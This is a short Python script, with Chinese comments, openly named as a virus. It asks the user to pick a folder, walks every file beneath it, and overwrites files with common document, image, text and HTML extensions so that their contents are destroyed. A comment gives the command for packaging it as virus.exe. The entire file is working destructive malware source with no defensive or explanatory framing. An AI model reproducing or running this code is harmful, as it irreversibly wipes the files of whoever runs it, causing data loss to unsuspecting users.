import os
import tkinter as tk
from tkinter import filedialog

# pyinstaller -F .\virus.py -n virus.exe

def virus(filename: str, modify_extension = ['pdf', 'jpg', 'jpeg', 'png', 'gif']):
    extension = filename.split('.')[-1]
    if extension in modify_extension:
        with open(filename, 'rb') as f:
            content = f.read()
            length = int(len(content)/2)
            f.close()

        with open(filename, 'wb') as f:
            f.seek(length)
            f.write('123456'.encode())
            f.close()
        print(f"{filename} is destroyed!")
def get_all_files(directory):
    filepath = []
    for dirpath, dirnames, filenames in os.walk(directory):
        for filename in filenames:
            filepath.append(os.path.join(dirpath, filename))
    # print(filepath)
    return filepath
def open_dir_path():
    # 創建主窗口
    root = tk.Tk()
    root.withdraw()  # 隱藏主窗口

    # 打開文件選取對話框
    # file_path = filedialog.askopenfilename()
    file_path = filedialog.askdirectory()

    # 打印選取的文件路徑
    # print(f"選取的文件路徑是: {file_path}")
    # print(f"選取的目錄路徑是: {file_path}")
    return file_path

if __name__ == "__main__":
    modify_extension = ['pdf', 'jpg', 'jpeg', 'png', 'gif', 'txt', 'html']
    # directory = os.getcwd() # 當前目錄
    directory = open_dir_path()
    filepath = get_all_files(directory)
    if len(filepath) != 0:
        for f in filepath:
            virus(f, modify_extension=modify_extension)
    else:
        print("filepath is empty!")
    input()




